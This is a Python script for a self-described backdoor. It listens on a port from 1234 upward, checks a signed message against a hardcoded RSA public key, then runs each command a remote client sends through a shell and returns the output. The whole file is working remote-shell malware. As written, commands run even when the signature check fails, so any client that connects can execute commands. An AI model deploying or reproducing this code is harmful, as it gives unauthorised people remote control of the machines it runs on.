import socket
import subprocess
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

HOST = '' 
BASE_PORT = 1234 
PUB_KEY = ''
 
s = None

def bind_socket(port = BASE_PORT, host = HOST):
    while port < 9999:
        try:
            s.bind((host, port))
            return True, port
        except Exception as msg:
            print("Bind failed: " + str(msg))
            port+=1
    return False, -1

def connect():
    s.listen()
    conn, addr = s.accept()
    print('[Backdoor] Connected with ' + addr[0] + ':' + str(addr[1]))
    return conn

PUB_KEY = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApdaSQ/NaY8PFvyNJjKZ6
pM40ZtpyPQqTfg0HE2e+G0sQ7kvKS/QxtJgo/NM+fgBPgaC4H3urapQ9EKlgbRLN
nAzMpARRLz1/CJMGW0nngKw9cTnogF6IzyS0vydUObWDh22jGE2oIV9ASeAu7ItE
8V371opZAgsx+TIMnfLQZPNKntE94J+V73JvzKSu1OflPXjfP8OWzfG9sQSMO06u
oauxewo7ktFuJnu3e9YrX9lCqwUPUFKvFuwhZdzoqa/fE9R3wAdMF9Sm8xrbcxIU
TzTPFbUH3+Ru6fQ8QvdaEci0GhSVqJnqXxbpAcN6loscNx2vpwFkLsivJvP8frzb
PwIDAQAB
-----END PUBLIC KEY-----
"""

def authenticate(conn):
    signature = conn.recv(4096)
    message = conn.recv(4096)
    success = True
    # with open("pubkey.pem", "rb") as key_file:
    pub = serialization.load_pem_public_key(
        PUB_KEY
    )

    try:
        # verify signed message
        pub.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
    except Exception as e:
        # verification failed
        success = False
    return success

def exec_cmds(conn):
    # while socket is connected
    while True:
        #recieving and executing messages
        full_cmd = conn.recv(4096).decode()
        if not full_cmd:
            conn.close()
            break

        process = subprocess.Popen(full_cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = process.communicate()
        # all_cmd_list = full_cmd.split("|")
        # all_cmd_list = [cmd.strip() for cmd in all_cmd_list]
        # pipe_output = None
        # if len(all_cmd_list) > 1:
        #     for cmd in all_cmd_list[0:len(all_cmd_list)-1]:
        #         cmd_list = cmd.split()
        #         if pipe_output:
        #             pipe_output = subprocess.Popen(cmd_list, stdin=pipe_output, stdout=subprocess.PIPE, shell = True)
        #         else:
        #             pipe_output = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, shell = True)
        #     final_output = subprocess.run(all_cmd_list[len(all_cmd_list)-1], stdin=pipe_output.stdout, text=True, capture_output=True, shell = True)
        # else:
        #     final_output = subprocess.run(full_cmd.split(), text=True, capture_output=True, shell=True)
        
        res = stdout if len(stdout) else stderr
        conn.send(res)

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok, port = bind_socket()
    if ok:
        print(f'[Backdoor] Socket bind complete on port {port}. Waiting for connection...')
    conn = connect()
    ok = authenticate(conn)
    if not ok:
        # close connection
        print('[Backdoor] Authentication failed.')
    else:
        print('[Backdoor] Authentication succeeded.')
        conn.send(b'success')
    exec_cmds(conn)
    